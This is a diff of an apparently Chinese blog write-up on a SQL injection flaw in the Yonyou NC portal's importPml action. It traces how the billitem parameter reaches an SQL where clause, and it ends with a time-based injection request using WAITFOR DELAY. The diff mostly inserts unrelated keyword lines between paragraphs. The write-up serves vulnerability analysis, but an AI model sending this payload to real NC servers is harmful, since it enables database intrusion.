@@ -26,9 +26,17 @@ NC63、NC633、NC65
 
 因此搜索 importPml 方法的实现部分即可定位文件
 
-计算机服务器
+安全编码指南
 
 nc/uap/portal/action/PortalPageManagerAction.class
+
+深入探索
+
+vpn
+
+在线工具箱
+
+软件安全测试
 
 ```
 package nc.uap.portal.action;
@@ -153,6 +161,8 @@ public void importPml() throws IOException {
 
 需要注意：请求体需要是文件上传格式
 
+漏洞扫描服务
+
 `billitem` 直接拼接进 `where` 语句中，然后代入 `PortalServiceUtil.getPageQryService().getPagesByCondition` 其实现逻辑如下
 
 ```
@@ -173,6 +183,8 @@ public PtPageVO[] getPagesByCondition(String condition) throws PortalServiceExce
 ```
 
 将 `where` 语句即 `condition` 又代入 `dao.retrieveByClause` 中，其实现逻辑如下
+
+计算机服务器
 
 ```
 public Collection retrieveByClause(Class className, String condition) throws DAOException {
@@ -254,7 +266,7 @@ private String buildSql(Class className, String condition, String[] fields) {
 
 [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")利用需要注意只能是文件上传格式，需要注意，可参考上面的[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")分析部分。
 
-编程
+SQL数据库优化
 
 ```
 POST /portal/pt/portalpage/importPml?pageId=login&billitem=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
